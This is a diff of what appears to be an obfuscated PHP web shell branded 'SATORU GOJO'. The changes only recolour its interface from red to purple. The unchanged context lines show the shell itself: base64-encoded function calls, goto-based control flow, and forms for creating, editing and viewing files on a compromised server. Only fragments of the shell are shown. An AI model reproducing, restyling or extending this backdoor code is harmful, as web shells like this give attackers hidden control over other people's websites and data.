@@ -170,7 +170,7 @@ function tF($yf)
 <meta property="og:image" content="https://raw.githubusercontent.com/kinglodon/kinglodon/main/faviconnn.png" />
 <meta property="og:title" content="✌" />
 <meta property="og:description" content="" />
-<meta name="theme-color" content="red">
+<meta name="theme-color" content="#4200ac">
 <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
 <title>✌</title>
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
@@ -206,20 +206,20 @@ body {
 }
 
 .border {
-    box-shadow: 0px 0px 10px red;
+    box-shadow: 0px 0px 10px #4200ac;
     border: 2px solid red!important;
     border-radius: 5px;
     background: transparent;
 }
 
 .border:hover {
-    box-shadow: 0px 0px 10px red;
+    box-shadow: 0px 0px 10px #4200ac;
     border: 2px solid red!important;
 }
 
 .table td {
     padding: 0.1rem;
-    box-shadow: inset 0px 0px 0px 1px red;
+    box-shadow: inset 0px 0px 0px 1px #4200ac;
     border-radius: 2px;
 }
 
@@ -228,7 +228,7 @@ body {
     color: yellow;
     padding: 0.25rem;
     border-radius: 5px;
-    box-shadow: inset 0px 0px 0px 1.5px red;
+    box-shadow: inset 0px 0px 0px 1.5px #4200ac;
     background-color: black;
 }
 
@@ -303,7 +303,7 @@ textarea {
 }
 
 button, input {
-    border: 2px solid red;
+    border: 2px solid #4200ac;
     border-radius: 5px;
     color: white;
     font-size: 14px;
@@ -321,7 +321,7 @@ button, input:hover {
     padding-left: 1rem;
     padding-right: 1rem;
     color: white;
-    border: 2px solid red;
+    border: 2px solid #4200ac;
     border-radius: 5px;
     background-color: transparent;
     font-family: inherit;
@@ -388,7 +388,7 @@ button, input:hover {
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
 <body>
-<div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid red;border-radius:5px;">
+<div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
     <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
         <a href="?" style="font-size: 2rem;font-family: Merienda;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">👑SATORU GOJO 👑</span></a>
     </div>
@@ -447,7 +447,7 @@ FA:
 ?>
         </li>
 </div>
-<div class="table-responsive text-light" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;border: 2px solid red;border-radius:5px;">
+<div class="table-responsive text-light" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;border: 2px solid #4200ac;border-radius:5px;">
 <li>Dir : <span><?php $Op = $c8[4](base64_decode('LyhcXHxcLykv'), $Jd);
 foreach ($Op as $j3 => $Oe) {
     if (!($j3 == 0 && $Oe == '')) {
@@ -537,7 +537,7 @@ if ($im == base64_decode('dmlldw==')) {
 goto WC;
 Fg:
 ?>
-<h5 class="p-1" style="text-align: center;border: 2px solid red;border-radius:5px;">New Folder Name :</h5>
+<h5 class="p-1" style="text-align: center;border: 2px solid #4200ac;border-radius:5px;">New Folder Name :</h5>
 <form method="post">
 <div class="form-group">
 <input name="n" id="n" class="border p-1" autocomplete="off" style="text-align: center;">
@@ -556,7 +556,7 @@ Fg:
 goto WC;
 Pb:
 ?>
-<h5 class="p-1" style="text-align: center;border: 2px solid red;border-radius:5px;">New File Name :</h5>
+<h5 class="p-1" style="text-align: center;border: 2px solid #4200ac;border-radius:5px;">New File Name :</h5>
 <form method="post">
 <div class="form-group">
 <input type="text" name="n" id="n" class="border p-1" placeholder="" style="text-align: center;">
@@ -603,7 +603,7 @@ Lw:
 goto WC;
 Ox:
 ?>
-<h5 class="p-1" style="text-align: center;border: 2px solid red;border-radius:5px;">Edit File Name : <font color="white"><?= Jd(
+<h5 class="p-1" style="text-align: center;border: 2px solid #4200ac;border-radius:5px;">Edit File Name : <font color="white"><?= Jd(
     $_GET[base64_decode('bg==')]
 ) ?></font></h5>
 <form method="post">
@@ -630,7 +630,7 @@ Ox:
 goto WC;
 Ag:
 ?>
-<h5 class="p-1" style="text-align: center;border: 2px solid red;border-radius:5px;">View File Name : <font color="white"><?= jd(
+<h5 class="p-1" style="text-align: center;border: 2px solid #4200ac;border-radius:5px;">View File Name : <font color="white"><?= jd(
     $_GET[base64_decode('bg==')]
 ) ?></font></h5>
 <div class="form-group">
